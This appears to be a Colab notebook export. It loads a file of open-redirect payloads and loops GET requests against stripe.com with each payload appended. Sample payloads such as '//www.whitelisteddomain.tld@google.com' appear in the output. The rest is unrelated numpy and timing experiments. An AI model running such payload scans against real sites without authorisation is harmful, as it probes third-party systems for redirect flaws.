# %%
from google.colab import drive
drive.mount('/content/drive')
# Out:
# Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount("/content/drive", force_remount=True).

# %%
cd drive/MyDrive/code/project_job_20/
# Out:
# /content/drive/MyDrive/code/project_job_20

# %%
pwd
# Out:
# '/content/drive/MyDrive/code/project_job_20'

# %%
with open('payload.txt') as f:
    alist = [line.rstrip() for line in f.readlines()]

# %%
import numpy as np

# %%
alist_array=np.array(alist)

# %%
import requests

# %%
data=np.array([])
for i in alist_array:
    url="https://stripe.com/en-in"+i
    o=requests.get(url)
    power=np.append(data,[o.status_code,url])

# %%
data
# Out:
# array([], dtype=float64)

# %%
power
# Out:
# array(['400',
#        'https://stripe.com/en-in////www.whitelisteddomain.tld@google.com/%2f..'],
#       dtype='<U70')

# %% [markdown]
# # above coding area ^

# %%
st="https://stripe.com/en-in"

# %%
st+alist[1]
# Out:
# 'https://stripe.com/en-in/%2f%2fexample.com'

# %%
tow=np.array([3,4,4,5])

# %%
# %timeit
for i in tow:
    print(i)
# %time
# Out:
# 3
# 4
# 4
# 5
# CPU times: user 2 µs, sys: 0 ns, total: 2 µs
# Wall time: 5.25 µs

# %%
for i in [3,4,4,5]:
    print(i)
# %time
# Out:
# 3
# 4
# 4
# 5
# CPU times: user 4 µs, sys: 0 ns, total: 4 µs
# Wall time: 9.78 µs

# %%
np.append(tow,[42,43])
# Out:
# array([ 3,  4,  4,  5, 42, 43])

# %%
np.append(tow,[42,43])
# Out:
# array([ 3,  4,  4,  5, 42, 43])

# %%
row=np.append(tow,[42,43])

# %%
row
# Out:
# array([ 3,  4,  4,  5, 42, 43])
